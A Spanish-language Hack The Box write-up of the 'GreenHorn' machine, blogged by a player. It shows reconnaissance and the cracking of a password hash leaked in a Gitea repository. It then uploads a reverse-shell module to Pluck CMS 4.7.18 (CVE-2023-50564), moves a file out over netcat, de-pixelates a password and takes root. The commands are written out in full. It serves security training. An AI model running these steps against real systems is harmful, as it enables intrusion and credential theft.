---
title: GreenHorn
description: GreenHorn es una máquina de dificultad fácil que aprovecha un exploit en Pluck para lograr la ejecución remota de código y luego demuestra los peligros de las credenciales pixeladas. La máquina también demuestra que debemos tener cuidado al compartir configuraciones de código abierto para asegurarnos de no revelar archivos que contengan contraseñas u otra información que deba mantenerse confidencial.
date: 2024-07-28
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-greenhorn/greenhorn_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - fuzzing_web
  - data_leaks
  - password_attacks
  - rfi
  - cve
  - ssh
  - http
  - tcp
  - information_gathering
  - web_analysis
  - data_leak_exploitation
  - cve_exploitation
  - privilege_escalation

---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ ping -c 1 10.10.11.25
PING 10.10.11.25 (10.10.11.25) 56(84) bytes of data.
64 bytes from 10.10.11.25: icmp_seq=1 ttl=63 time=340 ms

--- 10.10.11.25 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 340.300/340.300/340.300/0.000 ms
```
```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ sudo nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.10.11.25 -oG map1
Host: 10.10.11.25 ()	Status: Up
Host: 10.10.11.25 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 3000/open/tcp//ppp///
```
```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ sudo nmap -sCV -p22,80,3000 -vvv 10.10.11.25 -oN map2
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 57:d6:92:8a:72:44:84:17:29:eb:5c:c9:63:6a:fe:fd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOp+cK9ugCW282Gw6Rqe+Yz+5fOGcZzYi8cmlGmFdFAjI1347tnkKumDGK1qJnJ1hj68bmzOONz/x1CMeZjnKMw=
|   256 40:ea:17:b1:b6:c5:3f:42:56:67:4a:3c:ee:75:23:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEZQbCc8u6r2CVboxEesTZTMmZnMuEidK9zNjkD2RGEv
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://greenhorn.htb/
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=cd7cdfa4239814d1; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=f0rdxs8xWMwAuXAB_lJpH8wNoeQ6MTcyMTUwODMzMzc3OTU4MjAyMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 20 Jul 2024 20:45:33 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>GreenHorn</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvYX
|   HTTPOptions: 
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: GET
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=9c13c6525b7e7453; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=SIKa5O6XzcU5-JXd8HmbaEzmMTs6MTcyMTUwODM0Mjg5NzgwNjg3Mg; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Sat, 20 Jul 2024 20:45:42 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=7/20%Time=669C21EC%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,252E,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=cd7cdfa4239814d1;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=f0rdxs8xWMwAuXAB_lJpH8wNoeQ6MTcyMTUwODMzMzc3OTU4MjAyMA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Sat,\x2020\x20Jul\x202024\x2020:45:33\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>GreenHorn</title>\n\t<link\x
SF:20rel=\"manifest\"\x20href=\"data:application/json;base64,eyJuYW1lIjoiR
SF:3JlZW5Ib3JuIiwic2hvcnRfbmFtZSI6IkdyZWVuSG9ybiIsInN0YXJ0X3VybCI6Imh0dHA6
SF:Ly9ncmVlbmhvcm4uaHRiOjMwMDAvIiwiaWNvbnMiOlt7InNyYyI6Imh0dHA6Ly9ncmVlbmh
SF:vcm4uaHRiOjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLC
SF:JzaXplcyI6IjUxMng1MTIifSx7InNyYyI6Imh0dHA6Ly9ncmVlbmhvcm4uaHRiOjMwMDAvY
SF:X")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(HTTPOptions,1BD,"HTTP/1\.0\x20405\x20Method\x20Not\x20All
SF:owed\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nAllow:\x20HEAD\r\nAllow:\x20
SF:HEAD\r\nAllow:\x20GET\r\nCache-Control:\x20max-age=0,\x20private,\x20mu
SF:st-revalidate,\x20no-transform\r\nSet-Cookie:\x20i_like_gitea=9c13c6525
SF:b7e7453;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csr
SF:f=SIKa5O6XzcU5-JXd8HmbaEzmMTs6MTcyMTUwODM0Mjg5NzgwNjg3Mg;\x20Path=/;\x2
SF:0Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAM
SF:EORIGIN\r\nDate:\x20Sat,\x2020\x20Jul\x202024\x2020:45:42\x20GMT\r\nCon
SF:tent-Length:\x200\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnectio
SF:n:\x20close\r\n\r\n400\x20Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ echo '10.10.11.25\tgreenhorn.htb' | sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ whatweb greenhorn.htb
http://greenhorn.htb/?file=welcome-to-greenhorn [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.25], MetaGenerator[pluck 4.7.18], Pluck-CMS[4.7.18], Title[Welcome to GreenHorn ! - GreenHorn], nginx[1.18.0]
```

---
## Web Analysis & Data Leak Exploitation

![](/assets/img/htb-writeup-greenhorn/greenhorn1_1.png)

Encuentro una página web que utiliza el CMS 'Pluck 4.7.18' y un panel de login.

![](/assets/img/htb-writeup-greenhorn/greenhorn1_2.png)

En el puerto 3000, está corriendo Gitea, un servicio para gestionar repositorios, con un proyecto llamado 'GreenHorn' subido por el usuario 'GreenAdmin'.

![](/assets/img/htb-writeup-greenhorn/greenhorn1_3.png)

![](/assets/img/htb-writeup-greenhorn/greenhorn1_4.png)

![](/assets/img/htb-writeup-greenhorn/greenhorn1_5.png)

Investigando más sobre 'Pluck', encuentro información relevante que podría ser útil.

<https://github.com/pluck-cms/pluck/wiki/Frequently-Asked-Questions>
	
En la sección "Changing the Password", se menciona una forma de modificar la contraseña perdida mediante FTP.

Parece que este archivo ```data\settings\pass.php``` contiene una contraseña encriptada.

![](/assets/img/htb-writeup-greenhorn/greenhorn1_6.png)

Al navegar hacia ese archivo en el repositorio 'GreenHorn', encuentro un hash cifrado con SHA2-512.

![](/assets/img/htb-writeup-greenhorn/greenhorn1_7.png)

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ hashcat --show 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163'
   # | Name                                            | Category
=====+=================================================+==============================
1700 | SHA2-512                                        | Raw Hash

```

Utilizo una herramienta en línea para descifrar el hash.

<https://10015.io/tools/sha512-encrypt-decrypt>

![](/assets/img/htb-writeup-greenhorn/greenhorn1_8.png)

Descifro el hash y obtengo como resultado la contraseña 'iloveyou1'.

Esta contraseña es válida para acceder al panel de login en ```http://greenhorn.htb/login.php```

![](/assets/img/htb-writeup-greenhorn/greenhorn2_1.png)

---
## CVE Exploitation

La versión actual de 'Pluck' (v4.7.18) es vulnerable a ejecución remota de código, [CVE-2023-50564](https://nvd.nist.gov/vuln/detail/CVE-2023-50564).

![](/assets/img/htb-writeup-greenhorn/greenhorn2_2.png)

La vulnerabilidad permite la instalación de módulos personalizados a través de la sección "Install Modules". Esta funcionalidad es explotable al cargar un módulo malicioso que contenga una reverse shell.

![](/assets/img/htb-writeup-greenhorn/greenhorn2_3.png)

Preparación del módulo malicioso

* Primero, clono el repositorio 'GreenHorn' desde el servicio Gitea que encontré corriendo en el puerto 3000. Esto me permite trabajar con una copia del módulo existente.
* Dentro del repositorio clonado, navego hasta la carpeta del módulo contactform, que es un módulo funcional de Pluck. Allí, descargo una reverse shell PHP.

<https://github.com/pentestmonkey/php-reverse-shell>

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ git clone http://greenhorn.htb:3000/GreenAdmin/GreenHorn.git

/home/kali/Documents/htb/machines/greenhorn/GreenHorn/data/modules/contactform:-$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
```

![](/assets/img/htb-writeup-greenhorn/greenhorn2_4.png)

* Reemplazo el archivo ```GreenHorn/data/modules/contactform/contactform.php``` por la reverse shell descargada ```php-reverse-shell.php```, renombrándola como ```exploit.php```.
* Renombro el archivo ```GreenHorn/data/modules/contactform/contactform.site.php``` por ```GreenHorn/data/modules/contactform/exploit.site.php```.
* Cambio el nombre de la carpeta ```GreenHorn/data/modules/contactform/``` a ```GreenHorn/data/modules/exploit/``` para reflejar el nuevo módulo.
* Comprimo la carpeta ```GreenHorn/data/modules/exploit/``` en un archivo ZIP listo para cargar.

```terminal
/home/kali/Documents/htb/machines/greenhorn/GreenHorn/data/modules:-$ mv contactform exploit

/home/kali/Documents/htb/machines/greenhorn/GreenHorn/data/modules:-$ zip -r exploit.zip exploit/
```

Ejecución del exploit

* Inicio un listener con Netcat en mi máquina para capturar la reverse shell cuando se active.

* Subo el archivo ZIP malicioso a través de la funcionalidad "Install Modules" en el panel de administración de Pluck.

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ nc -lnvp 1234
	listening on [any] 1234 ...
```

![](/assets/img/htb-writeup-greenhorn/greenhorn2_5.png)

Una vez subido el módulo, la reverse shell se activa, y obtengo acceso remoto al sistema con los privilegios del usuario 'www-data'.

```terminal
	...connect to [10.10.16.75] from (UNKNOWN) [10.10.11.25] 35624

$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@greenhorn:/$ whoami
www-data
```

```terminal
www-data@greenhorn:/$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
git:x:114:120:Git Version Control,,,:/home/git:/bin/bash
junior:x:1000:1000::/home/junior:/bin/bash
```

Resulta ser que la contraseña 'iloveyou1' es valida para el usuario 'junior'.

```terminal
www-data@greenhorn:/$ su junior
password: iloveyou1

junior@greenhorn:~$ cat user
```

---
## Privilege Escalation

En el directorio principal del usuario 'junior', encontré un archivo PDF titulado 'Using OpenVAS.pdf'.

Para analizarlo en mi máquina local, transfiero el archivo utilizando Netcat.

![](/assets/img/htb-writeup-greenhorn/greenhorn3_1.png)

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ nc -lvp 54321 > 'Using OpenVAS.pdf'

junior@greenhorn:~$ nc 10.10.16.84 54321 < 'Using OpenVAS.pdf'
```

El PDF contiene una contraseña pixelada.

![](/assets/img/htb-writeup-greenhorn/greenhorn3_2.png)

Puedo extraer una imagen específica, utilicé la herramienta 'pdfimages', que permite extraer imágenes directamente desde archivos PDF.
Esto generó un archivo de imagen en formato '.ppm' con el nombre 'OpenVAS-000.ppm'.

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ pdfimages "./Using OpenVAS.pdf" OpenVAS
```

![](/assets/img/htb-writeup-greenhorn/greenhorn3_3.png)

Para intentar recuperar la contraseña pixelada, usé la herramienta Depix, diseñada para reconstruir texto pixelado mediante análisis de patrones.

<https://github.com/spipm/Depix>

```terminal
/home/kali/Documents/htb/machines/greenhorn:-$ git clone https://github.com/spipm/Depix.git

/home/kali/Documents/htb/machines/greenhorn:-$ python3 depix.py -p /home/kali/Documents/htb/machines/greenhorn/OpenVAS-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o /home/kali/Documents/htb/machines/greenhorn/output.png 
2024-07-28 16:18:05,739 - Loading pixelated image from /home/kali/Documents/htb/machines/greenhorn/OpenVAS-000.ppm
2024-07-28 16:18:05,747 - Loading search image from images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
2024-07-28 16:18:06,262 - Finding color rectangles from pixelated space
2024-07-28 16:18:06,263 - Found 252 same color rectangles
2024-07-28 16:18:06,263 - 190 rectangles left after moot filter
2024-07-28 16:18:06,263 - Found 1 different rectangle sizes
2024-07-28 16:18:06,263 - Finding matches in search image
2024-07-28 16:18:06,263 - Scanning 190 blocks with size (5, 5)
2024-07-28 16:18:06,285 - Scanning in searchImage: 0/1674
2024-07-28 16:18:42,110 - Removing blocks with no matches
2024-07-28 16:18:42,110 - Splitting single matches and multiple matches
2024-07-28 16:18:42,115 - [16 straight matches | 174 multiple matches]
2024-07-28 16:18:42,115 - Trying geometrical matches on single-match squares
2024-07-28 16:18:42,368 - [29 straight matches | 161 multiple matches]
2024-07-28 16:18:42,368 - Trying another pass on geometrical matches
2024-07-28 16:18:42,593 - [41 straight matches | 149 multiple matches]
2024-07-28 16:18:42,593 - Writing single match results to output
2024-07-28 16:18:42,593 - Writing average results for multiple matches to output
2024-07-28 16:18:44,631 - Saving output image to: /home/kali/Documents/htb/machines/greenhorn/output.png
```

Se genera un archivo con el texto reconstruido en 'output.png'.

![](/assets/img/htb-writeup-greenhorn/greenhorn3_4.png)

```terminal
junior@greenhorn:~$ su root
Password: sidefromsidetheothersidesidefromsidetheotherside

root@greenhorn:~# cat root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/617" target="_blank">Greenhorn Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }